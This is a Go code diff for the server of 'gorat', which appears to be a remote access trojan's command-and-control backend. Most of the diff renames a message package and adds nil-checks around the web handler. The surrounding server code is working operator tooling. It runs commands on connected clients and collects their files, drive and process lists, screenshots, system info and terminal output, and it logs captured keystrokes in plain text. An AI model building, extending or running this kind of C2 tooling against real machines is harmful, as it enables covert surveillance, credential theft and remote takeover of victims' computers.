@@ -11,10 +11,10 @@ import (
 	"sync"
 	"time"
 
-	"gorat/common"
 	"gorat/pkg/auth"
 	"gorat/pkg/clients"
 	"gorat/pkg/messaging"
+	"gorat/pkg/protocol"
 	"gorat/pkg/storage"
 
 	"github.com/gin-gonic/gin"
@@ -39,13 +39,13 @@ type Server struct {
 	terminalProxy      *TerminalProxy
 	proxyManager       *ProxyManager
 	dispatcher         messaging.Dispatcher
-	commandResults     map[string]*common.CommandResultPayload
-	fileListResults    map[string]*common.FileListPayload
-	driveListResults   map[string]*common.DriveListPayload
-	fileDataResults    map[string]*common.FileDataPayload
-	screenshotResults  map[string]*common.ScreenshotDataPayload
-	processListResults map[string]*common.ProcessListPayload
-	systemInfoResults  map[string]*common.SystemInfoPayload
+	commandResults     map[string]*protocol.CommandResultPayload
+	fileListResults    map[string]*protocol.FileListPayload
+	driveListResults   map[string]*protocol.DriveListPayload
+	fileDataResults    map[string]*protocol.FileDataPayload
+	screenshotResults  map[string]*protocol.ScreenshotDataPayload
+	processListResults map[string]*protocol.ProcessListPayload
+	systemInfoResults  map[string]*protocol.SystemInfoPayload
 	resultsMu          sync.RWMutex
 	httpServer         *http.Server
 	serverMu           sync.Mutex
@@ -88,7 +88,7 @@ func NewServer(config *Config) *Server {
 	if err != nil {
 		log.Printf("ERROR: Failed to create web handler: %v", err)
 		log.Println("Server will continue with limited web functionality")
-		// Create a minimal web handler or continue without it
+		webHandler = nil // Explicitly set to nil
 	}
 
 	server := &Server{
@@ -99,13 +99,13 @@ func NewServer(config *Config) *Server {
 		webHandler:         webHandler,
 		terminalProxy:      terminalProxy,
 		dispatcher:         messaging.NewDispatcher(),
-		commandResults:     make(map[string]*common.CommandResultPayload),
-		fileListResults:    make(map[string]*common.FileListPayload),
-		driveListResults:   make(map[string]*common.DriveListPayload),
-		fileDataResults:    make(map[string]*common.FileDataPayload),
-		screenshotResults:  make(map[string]*common.ScreenshotDataPayload),
-		processListResults: make(map[string]*common.ProcessListPayload),
-		systemInfoResults:  make(map[string]*common.SystemInfoPayload),
+		commandResults:     make(map[string]*protocol.CommandResultPayload),
+		fileListResults:    make(map[string]*protocol.FileListPayload),
+		driveListResults:   make(map[string]*protocol.DriveListPayload),
+		fileDataResults:    make(map[string]*protocol.FileDataPayload),
+		screenshotResults:  make(map[string]*protocol.ScreenshotDataPayload),
+		processListResults: make(map[string]*protocol.ProcessListPayload),
+		systemInfoResults:  make(map[string]*protocol.SystemInfoPayload),
 	}
 
 	// Initialize message dispatcher with handlers
@@ -157,6 +157,19 @@ func NewServerWithServices(services *Services) (*Server, error) {
 	manager := services.ClientMgr
 	store := services.Storage
 
+	// Create webHandler with proper configuration
+	webConfig := &WebConfig{
+		Username: services.Config.WebUI.Username,
+		Password: services.Config.WebUI.Password,
+	}
+
+	webHandler, err := NewWebHandler(services.SessionMgr, manager, store, webConfig)
+	if err != nil {
+		log.Printf("WARNING: Failed to create web handler: %v", err)
+		log.Println("Server will continue with API-only functionality")
+		webHandler = nil
+	}
+
 	server := &Server{
 		manager: manager,
 		store:   store,
@@ -169,21 +182,26 @@ func NewServerWithServices(services *Services) (*Server, error) {
 			WebPassword: services.Config.WebUI.Password,
 		},
 		authenticator:      NewAuthenticator(""),
-		webHandler:         nil, // Will use APIHandler instead
+		webHandler:         webHandler, // Properly initialize the webHandler
 		terminalProxy:      services.TermProxy,
 		proxyManager:       services.ProxyMgr,
 		dispatcher:         messaging.NewDispatcher(),
-		commandResults:     make(map[string]*common.CommandResultPayload),
-		fileListResults:    make(map[string]*common.FileListPayload),
-		driveListResults:   make(map[string]*common.DriveListPayload),
-		fileDataResults:    make(map[string]*common.FileDataPayload),
-		screenshotResults:  make(map[string]*common.ScreenshotDataPayload),
-		processListResults: make(map[string]*common.ProcessListPayload),
-		systemInfoResults:  make(map[string]*common.SystemInfoPayload),
+		commandResults:     make(map[string]*protocol.CommandResultPayload),
+		fileListResults:    make(map[string]*protocol.FileListPayload),
+		driveListResults:   make(map[string]*protocol.DriveListPayload),
+		fileDataResults:    make(map[string]*protocol.FileDataPayload),
+		screenshotResults:  make(map[string]*protocol.ScreenshotDataPayload),
+		processListResults: make(map[string]*protocol.ProcessListPayload),
+		systemInfoResults:  make(map[string]*protocol.SystemInfoPayload),
 	}
 
 	// Initialize message dispatcher
 	server.initializeDispatcher()
+
+	// Set server reference in web handler
+	if webHandler != nil {
+		webHandler.server = server
+	}
 
 	return server, nil
 }
@@ -302,7 +320,15 @@ func (s *Server) Start() error {
 	router.POST("/api/push-update", s.ginHandlePushUpdate)
 
 	// Web UI routes (migrate from old handler)
-	s.webHandler.RegisterGinRoutes(router)
+	if s.webHandler != nil {
+		s.webHandler.RegisterGinRoutes(router)
+	} else {
+		log.Println("WARNING: WebHandler is nil, skipping web UI routes registration")
+		// Register minimal fallback routes
+		router.GET("/", func(c *gin.Context) {
+			c.JSON(http.StatusServiceUnavailable, gin.H{"error": "Web UI not available"})
+		})
+	}
 
 	log.Printf("Server starting on %s", s.config.Address)
 
@@ -350,7 +376,11 @@ func (s *Server) ginHandleWebSocket(c *gin.Context) {
 }
 
 func (s *Server) ginHandleClientsAPI(c *gin.Context) {
-	s.webHandler.HandleClientsAPI(c.Writer, c.Request)
+	if s.webHandler != nil {
+		s.webHandler.HandleClientsAPI(c.Writer, c.Request)
+	} else {
+		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "Web handler not available"})
+	}
 }
 
 func (s *Server) ginHandleSendCommand(c *gin.Context) {
@@ -407,7 +437,7 @@ func (s *Server) ginHandleClientGetQuery(c *gin.Context) {
 	// Return metadata - extract from client using interface methods
 	meta := client.Metadata()
 	if meta == nil {
-		meta = &common.ClientMetadata{
+		meta = &protocol.ClientMetadata{
 			ID:     client.ID(),
 			Status: "unknown",
 		}
@@ -481,7 +511,7 @@ func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// Wait for authentication message
-	var authMsg common.Message
+	var authMsg protocol.Message
 	err = conn.ReadJSON(&authMsg)
 	if err != nil {
 		log.Printf("Failed to read auth message: %v", err)
@@ -489,13 +519,13 @@ func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	if authMsg.Type != common.MsgTypeAuth {
+	if authMsg.Type != protocol.MsgTypeAuth {
 		log.Printf("Expected auth message, got: %s", authMsg.Type)
 		conn.Close()
 		return
 	}
 
-	var authPayload common.AuthPayload
+	var authPayload protocol.AuthPayload
 	err = authMsg.ParsePayload(&authPayload)
 	if err != nil {
 		log.Printf("Failed to parse auth payload: %v", err)
@@ -508,28 +538,28 @@ func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 	token := authPayload.ClientID
 
 	// Send authentication response
-	respPayload := &common.AuthResponsePayload{
+	respPayload := &protocol.AuthResponsePayload{
 		Success: authenticated,
 		Token:   token,
 	}
 
 	if !authenticated {
 		respPayload.Message = "Authentication failed"
-		respMsg, _ := common.NewMessage(common.MsgTypeAuthResponse, respPayload)
+		respMsg, _ := protocol.NewMessage(protocol.MsgTypeAuthResponse, respPayload)
 		conn.WriteJSON(respMsg)
 		conn.Close()
 		return
 	}
 
 	respPayload.Message = "Authentication successful"
-	respMsg, _ := common.NewMessage(common.MsgTypeAuthResponse, respPayload)
+	respMsg, _ := protocol.NewMessage(protocol.MsgTypeAuthResponse, respPayload)
 	conn.WriteJSON(respMsg)
 
 	// Get public IP from request headers
 	publicIP := getClientIP(r)
 
 	// Create client metadata
-	metadata := &common.ClientMetadata{
+	metadata := &protocol.ClientMetadata{
 		ID:          authPayload.ClientID,
 		Token:       token,
 		OS:          authPayload.OS,
@@ -559,7 +589,7 @@ func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// Update metadata with initial values (after registration)
-	client.UpdateMetadata(func(m *common.ClientMetadata) {
+	client.UpdateMetadata(func(m *protocol.ClientMetadata) {
 		m.Token = token
 		m.OS = authPayload.OS
 		m.Arch = authPayload.Arch
@@ -621,7 +651,7 @@ func (s *Server) readPump(client clients.Client) {
 		}
 
 		// Update last seen
-		s.manager.UpdateClientMetadata(client.ID(), func(m *common.ClientMetadata) {
+		s.manager.UpdateClientMetadata(client.ID(), func(m *protocol.ClientMetadata) {
 			m.LastSeen = time.Now()
 		})
 
@@ -669,9 +699,9 @@ func (s *Server) readPump(client clients.Client) {
 			}
 		}
 
-		// Not a proxy message, parse as common.Message
+		// Not a proxy message, parse as protocol.Message
 		jsonData, _ := json.Marshal(rawMsg)
-		var msg common.Message
+		var msg protocol.Message
 		if err := json.Unmarshal(jsonData, &msg); err != nil {
 			log.Printf("Failed to parse message from %s: %v", client.ID(), err)
 			continue
@@ -715,7 +745,7 @@ func (s *Server) writePump(client clients.Client) {
 }
 
 // handleMessage handles incoming messages from clients
-func (s *Server) handleMessage(client clients.Client, msg *common.Message) {
+func (s *Server) handleMessage(client clients.Client, msg *protocol.Message) {
 	defer func() {
 		if r := recover(); r != nil {
 			log.Printf("PANIC RECOVERED in handleMessage for client %s: %v", client.ID(), r)
@@ -723,17 +753,17 @@ func (s *Server) handleMessage(client clients.Client, msg *common.Message) {
 	}()
 
 	switch msg.Type {
-	case common.MsgTypeHeartbeat:
-		var hb common.HeartbeatPayload
+	case protocol.MsgTypeHeartbeat:
+		var hb protocol.HeartbeatPayload
 		if err := msg.ParsePayload(&hb); err == nil {
-			s.manager.UpdateClientMetadata(client.ID(), func(m *common.ClientMetadata) {
+			s.manager.UpdateClientMetadata(client.ID(), func(m *protocol.ClientMetadata) {
 				m.Status = hb.Status
 				m.LastHeartbeat = time.Now()
 			})
 		}
 
-	case common.MsgTypeCommandResult:
-		var cr common.CommandResultPayload
+	case protocol.MsgTypeCommandResult:
+		var cr protocol.CommandResultPayload
 		if err := msg.ParsePayload(&cr); err == nil {
 			log.Printf("Command result from %s: success=%v, exit_code=%d", client.ID(), cr.Success, cr.ExitCode)
 			s.resultsMu.Lock()
@@ -743,8 +773,8 @@ func (s *Server) handleMessage(client clients.Client, msg *common.Message) {
 			log.Printf("Command result from %s: %s", client.ID(), string(msg.Payload))
 		}
 
-	case common.MsgTypeFileList:
-		var fl common.FileListPayload
+	case protocol.MsgTypeFileList:
+		var fl protocol.FileListPayload
 		if err := msg.ParsePayload(&fl); err == nil {
 			log.Printf("File list from %s: %d files", client.ID(), len(fl.Files))
 			s.resultsMu.Lock()
@@ -754,8 +784,8 @@ func (s *Server) handleMessage(client clients.Client, msg *common.Message) {
 			log.Printf("File list from %s", client.ID())
 		}
 
-	case common.MsgTypeDriveList:
-		var dl common.DriveListPayload
+	case protocol.MsgTypeDriveList:
+		var dl protocol.DriveListPayload
 		if err := msg.ParsePayload(&dl); err == nil {
 			log.Printf("Drive list from %s: %d drives", client.ID(), len(dl.Drives))
 			s.resultsMu.Lock()
@@ -765,8 +795,8 @@ func (s *Server) handleMessage(client clients.Client, msg *common.Message) {
 			log.Printf("Drive list from %s", client.ID())
 		}
 
-	case common.MsgTypeProcessList:
-		var pl common.ProcessListPayload
+	case protocol.MsgTypeProcessList:
+		var pl protocol.ProcessListPayload
 		if err := msg.ParsePayload(&pl); err == nil {
 			log.Printf("Process list from %s: %d processes", client.ID(), len(pl.Processes))
 			s.SetProcessListResult(client.ID(), &pl)
@@ -774,8 +804,8 @@ func (s *Server) handleMessage(client clients.Client, msg *common.Message) {
 			log.Printf("Process list from %s", client.ID())
 		}
 
-	case common.MsgTypeSystemInfo:
-		var si common.SystemInfoPayload
+	case protocol.MsgTypeSystemInfo:
+		var si protocol.SystemInfoPayload
 		if err := msg.ParsePayload(&si); err == nil {
 			log.Printf("System info from %s: %s (%s %s)", client.ID(), si.Hostname, si.OS, si.Arch)
 			s.SetSystemInfoResult(client.ID(), &si)
@@ -783,8 +813,8 @@ func (s *Server) handleMessage(client clients.Client, msg *common.Message) {
 			log.Printf("System info from %s", client.ID())
 		}
 
-	case common.MsgTypeFileData:
-		var fd common.FileDataPayload
+	case protocol.MsgTypeFileData:
+		var fd protocol.FileDataPayload
 		if err := msg.ParsePayload(&fd); err == nil {
 			log.Printf("File data from %s: %s (%d bytes)", client.ID(), fd.Path, len(fd.Data))
 			s.resultsMu.Lock()
@@ -794,8 +824,8 @@ func (s *Server) handleMessage(client clients.Client, msg *common.Message) {
 			log.Printf("File data from %s", client.ID())
 		}
 
-	case common.MsgTypeScreenshotData:
-		var sd common.ScreenshotDataPayload
+	case protocol.MsgTypeScreenshotData:
+		var sd protocol.ScreenshotDataPayload
 		if err := msg.ParsePayload(&sd); err == nil {
 			log.Printf("Screenshot received from %s: %dx%d, %d bytes", client.ID(), sd.Width, sd.Height, len(sd.Data))
 			s.resultsMu.Lock()
@@ -805,25 +835,25 @@ func (s *Server) handleMessage(client clients.Client, msg *common.Message) {
 			log.Printf("Screenshot received from %s", client.ID())
 		}
 
-	case common.MsgTypeKeyloggerData:
-		var kld common.KeyloggerDataPayload
+	case protocol.MsgTypeKeyloggerData:
+		var kld protocol.KeyloggerDataPayload
 		if err := msg.ParsePayload(&kld); err == nil {
 			log.Printf("Keylogger data from %s: %s", client.ID(), kld.Keys)
 		}
 
-	case common.MsgTypeUpdateStatus:
-		var us common.UpdateStatusPayload
+	case protocol.MsgTypeUpdateStatus:
+		var us protocol.UpdateStatusPayload
 		if err := msg.ParsePayload(&us); err == nil {
 			log.Printf("Update status from %s: %s - %s", client.ID(), us.Status, us.Message)
 		}
 
-	case common.MsgTypeTerminalOutput:
-		var to common.TerminalOutputPayload
+	case protocol.MsgTypeTerminalOutput:
+		var to protocol.TerminalOutputPayload
 		if err := msg.ParsePayload(&to); err == nil {
 			s.terminalProxy.HandleTerminalOutput(to.SessionID, to.Data, false)
 		}
 
-	case common.MsgTypePong:
+	case protocol.MsgTypePong:
 		// Heartbeat response
 
 	default:
@@ -834,7 +864,7 @@ func (s *Server) handleMessage(client clients.Client, msg *common.Message) {
 // handleGetClients returns list of connected clients
 func (s *Server) handleGetClients(w http.ResponseWriter, r *http.Request) {
 	clients := s.manager.GetAllClients()
-	metadata := make([]*common.ClientMetadata, len(clients))
+	metadata := make([]*protocol.ClientMetadata, len(clients))
 
 	for i, client := range clients {
 		meta := client.Metadata()
@@ -855,8 +885,8 @@ func (s *Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
 	}
 
 	var req struct {
-		ClientID string                       `json:"client_id"`
-		Command  common.ExecuteCommandPayload `json:"command"`
+		ClientID string                         `json:"client_id"`
+		Command  protocol.ExecuteCommandPayload `json:"command"`
 	}
 
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
@@ -864,7 +894,7 @@ func (s *Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	msg, err := common.NewMessage(common.MsgTypeExecuteCommand, req.Command)
+	msg, err := protocol.NewMessage(protocol.MsgTypeExecuteCommand, req.Command)
 	if err != nil {
 		http.Error(w, "Failed to create message", http.StatusInternalServerError)
 		return
@@ -907,28 +937,28 @@ func (s *Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
 }
 
 // GetCommandResult retrieves stored command result for a client
-func (s *Server) GetCommandResult(clientID string) *common.CommandResultPayload {
+func (s *Server) GetCommandResult(clientID string) *protocol.CommandResultPayload {
 	s.resultsMu.RLock()
 	defer s.resultsMu.RUnlock()
 	return s.commandResults[clientID]
 }
 
 // SetCommandResult stores command result for a client
-func (s *Server) SetCommandResult(clientID string, payload *common.CommandResultPayload) {
+func (s *Server) SetCommandResult(clientID string, payload *protocol.CommandResultPayload) {
 	s.resultsMu.Lock()
 	defer s.resultsMu.Unlock()
 	s.commandResults[clientID] = payload
 }
 
 // GetFileListResult retrieves stored file list result for a client
-func (s *Server) GetFileListResult(clientID string) *common.FileListPayload {
+func (s *Server) GetFileListResult(clientID string) *protocol.FileListPayload {
 	s.resultsMu.RLock()
 	defer s.resultsMu.RUnlock()
 	return s.fileListResults[clientID]
 }
 
 // SetFileListResult stores file list result for a client
-func (s *Server) SetFileListResult(clientID string, payload *common.FileListPayload) {
+func (s *Server) SetFileListResult(clientID string, payload *protocol.FileListPayload) {
 	s.resultsMu.Lock()
 	defer s.resultsMu.Unlock()
 	s.fileListResults[clientID] = payload
@@ -942,14 +972,14 @@ func (s *Server) ClearFileListResult(clientID string) {
 }
 
 // GetDriveListResult retrieves stored drive list result for a client
-func (s *Server) GetDriveListResult(clientID string) *common.DriveListPayload {
+func (s *Server) GetDriveListResult(clientID string) *protocol.DriveListPayload {
 	s.resultsMu.RLock()
 	defer s.resultsMu.RUnlock()
 	return s.driveListResults[clientID]
 }
 
 // SetDriveListResult stores drive list result for a client
-func (s *Server) SetDriveListResult(clientID string, payload *common.DriveListPayload) {
+func (s *Server) SetDriveListResult(clientID string, payload *protocol.DriveListPayload) {
 	s.resultsMu.Lock()
 	defer s.resultsMu.Unlock()
 	s.driveListResults[clientID] = payload
@@ -963,14 +993,14 @@ func (s *Server) ClearDriveListResult(clientID string) {
 }
 
 // GetScreenshotResult retrieves stored screenshot result for a client
-func (s *Server) GetScreenshotResult(clientID string) *common.ScreenshotDataPayload {
+func (s *Server) GetScreenshotResult(clientID string) *protocol.ScreenshotDataPayload {
 	s.resultsMu.RLock()
 	defer s.resultsMu.RUnlock()
 	return s.screenshotResults[clientID]
 }
 
 // SetScreenshotResult stores screenshot result for a client
-func (s *Server) SetScreenshotResult(clientID string, payload *common.ScreenshotDataPayload) {
+func (s *Server) SetScreenshotResult(clientID string, payload *protocol.ScreenshotDataPayload) {
 	s.resultsMu.Lock()
 	defer s.resultsMu.Unlock()
 	s.screenshotResults[clientID] = payload
@@ -984,14 +1014,14 @@ func (s *Server) ClearScreenshotResult(clientID string) {
 }
 
 // GetFileDataResult retrieves stored file data result for a client
-func (s *Server) GetFileDataResult(clientID string) *common.FileDataPayload {
+func (s *Server) GetFileDataResult(clientID string) *protocol.FileDataPayload {
 	s.resultsMu.RLock()
 	defer s.resultsMu.RUnlock()
 	return s.fileDataResults[clientID]
 }
 
 // SetFileDataResult stores file data result for a client
-func (s *Server) SetFileDataResult(clientID string, payload *common.FileDataPayload) {
+func (s *Server) SetFileDataResult(clientID string, payload *protocol.FileDataPayload) {
 	s.resultsMu.Lock()
 	defer s.resultsMu.Unlock()
 	s.fileDataResults[clientID] = payload
@@ -1005,12 +1035,12 @@ func (s *Server) ClearFileDataResult(clientID string) {
 }
 
 // GetProcessListResult retrieves stored process list result for a client
-func (s *Server) GetProcessListResult(clientID string) *common.ProcessListPayload {
+func (s *Server) GetProcessListResult(clientID string) *protocol.ProcessListPayload {
 	s.resultsMu.RLock()
 	defer s.resultsMu.RUnlock()
 	return s.processListResults[clientID]
 } // SetProcessListResult stores process list result for a client
-func (s *Server) SetProcessListResult(clientID string, payload *common.ProcessListPayload) {
+func (s *Server) SetProcessListResult(clientID string, payload *protocol.ProcessListPayload) {
 	s.resultsMu.Lock()
 	defer s.resultsMu.Unlock()
 	s.processListResults[clientID] = payload
@@ -1024,14 +1054,14 @@ func (s *Server) ClearProcessListResult(clientID string) {
 }
 
 // GetSystemInfoResult retrieves stored system info result for a client
-func (s *Server) GetSystemInfoResult(clientID string) *common.SystemInfoPayload {
+func (s *Server) GetSystemInfoResult(clientID string) *protocol.SystemInfoPayload {
 	s.resultsMu.RLock()
 	defer s.resultsMu.RUnlock()
 	return s.systemInfoResults[clientID]
 }
 
 // SetSystemInfoResult stores system info result for a client
-func (s *Server) SetSystemInfoResult(clientID string, payload *common.SystemInfoPayload) {
+func (s *Server) SetSystemInfoResult(clientID string, payload *protocol.SystemInfoPayload) {
 	s.resultsMu.Lock()
 	defer s.resultsMu.Unlock()
 	s.systemInfoResults[clientID] = payload
@@ -1195,7 +1225,7 @@ func (s *Server) loadSavedProxies() {
 }
 
 // UpdateClientMetadata implements messaging.ClientMetadataUpdater
-func (s *Server) UpdateClientMetadata(clientID string, fn func(*common.ClientMetadata)) {
+func (s *Server) UpdateClientMetadata(clientID string, fn func(*protocol.ClientMetadata)) {
 	// Ignore error - client may not exist yet, which is fine for heartbeat updates
 	_ = s.manager.UpdateClientMetadata(clientID, fn)
 }
